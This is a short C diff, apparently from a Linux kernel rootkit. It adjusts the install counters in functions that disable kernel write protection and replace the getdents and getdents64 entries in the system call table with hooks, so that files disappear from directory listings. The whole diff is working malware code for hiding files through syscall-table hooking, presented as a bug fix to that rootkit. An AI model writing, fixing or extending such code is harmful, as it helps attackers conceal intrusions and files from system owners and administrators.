@@ -14,9 +14,7 @@
 void
 hide_files(void)
 {
-    if (atomic_inc_return(&getdents_install_count) >= 1) {
-        atomic_set(&getdents_install_count, 1);
-
+    if (atomic_inc_return(&getdents_install_count) == 1) {
         disable_protection();
         sys_calls[__NR_getdents] = (void *)g7_getdents;
         sys_calls[__NR_getdents64] = (void *)g7_getdents64;
@@ -27,9 +25,7 @@ hide_files(void)
 void
 unhide_files(void)
 {
-    if (atomic_dec_return(&getdents_install_count) < 0) {
-        atomic_set(&getdents_install_count, 0);
-
+    if (atomic_dec_return(&getdents_install_count) < 1) {
         if (sys_getdents) {
             disable_protection();
             sys_calls[__NR_getdents] = (void *)sys_getdents;
